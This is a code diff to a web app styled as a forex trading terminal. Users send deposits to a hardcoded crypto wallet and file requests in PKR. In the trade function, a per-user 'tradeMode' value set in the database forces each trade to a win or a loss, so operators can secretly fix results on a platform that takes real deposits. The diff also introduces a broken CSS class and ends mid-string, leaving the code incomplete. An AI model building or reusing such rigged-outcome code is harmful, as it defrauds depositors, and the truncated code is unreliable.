@@ -101,7 +101,7 @@
     </div>
 
     <div id="settingsM" class="modal">
-        <div class="glass-card p-8 rounded-[32px] w-full max-w-sm text-center">
+        <div class="glass-card p-8 rounded-[32px] w-full max-sm text-center">
             <div class="flex justify-between items-center mb-6">
                 <h2 class="text-[10px] font-black text-gray-500 uppercase tracking-widest">Account Details</h2>
                 <button onclick="hideM('settingsM')" class="text-gray-500 text-2xl font-light">&times;</button>
@@ -184,6 +184,7 @@
 
         function copyWallet() { navigator.clipboard.writeText('TAaTmYha48Pbft4aJn1RGyKmVoQZKuLArM'); document.getElementById('copyBtn').innerText="COPIED!"; setTimeout(()=>document.getElementById('copyBtn').innerText="COPY",2000); }
 
+        // --- SESSION VERIFICATION FIX ---
         auth.onAuthStateChanged(user => {
             const loader = document.getElementById('loadingScreen');
             if(user) {
@@ -195,16 +196,22 @@
                         document.getElementById('userInitial').innerText = initial;
                         document.getElementById('modalInitial').innerText = initial;
                         document.getElementById('modalEmail').innerText = user.email;
+                        
                         document.getElementById('authSection').style.display = 'none';
                         document.getElementById('appTerminal').style.display = 'flex';
                         if(!chartLoaded) { loadChart('FX:EURUSD'); chartLoaded = true; }
+                        loader.style.display = 'none'; // Loader hidden when data loaded
+                    } else {
+                        // In case user exists in auth but not in firestore yet
                         loader.style.display = 'none';
                     }
+                }, (error) => {
+                    loader.style.display = 'none';
                 });
             } else { 
                 document.getElementById('authSection').style.display = 'flex'; 
                 document.getElementById('appTerminal').style.display = 'none'; 
-                loader.style.display = 'none'; 
+                loader.style.display = 'none'; // Loader hidden when no user
             }
         });
 
@@ -236,9 +243,7 @@
             const name = document.getElementById('depAccName').value;
             const sentAmt = document.getElementById('depSentAmt').value;
             const tx = document.getElementById('depTx').value;
-            
             if(!name || !sentAmt || !tx) return showError("Please fill all fields");
-            
             try {
                 await db.collection('requests').add({ 
                     uid: auth.currentUser.uid, 
@@ -246,7 +251,7 @@
                     accountName: name,
                     sentAmount: sentAmt,
                     txid: tx, 
-                    requestedAmount: document.getElementById('depAmtInput').value, // PKR amount from Step 1
+                    requestedAmount: document.getElementById('depAmtInput').value,
                     time: Date.now(),
                     status: 'pending'
                 });
@@ -283,6 +288,4 @@
             const m = userData.tradeMode || 'normal';
             let win = m === 'profit' ? true : (m === 'loss' ? false : Math.random() > 0.5);
             const p = amt * 1.82, box = document.getElementById('resultBox');
-            if(win) { await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(p) }); box.innerHTML = `<h2 class="text-green-500 font-black">PROFIT</h2><h1 class="text-4xl">+$${p.toFixed(2)}</h1>`; }
-            else { box.innerHTML = `<h2 class="text-red-500 font-black">LOSS</h2><h1 class="text-4xl">-$${amt.toFixed(2)}</h1>`; }
-            box.innerHTML += `<button onclick="hideM('resultM')" class="w-full bg-white/10 py-3 rounded-xl mt-6 uppercase font-bold text-sm
+            if(win) { await db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(p) }); box.innerHTML = `<h2 class="text-green-500 font-black">PROF
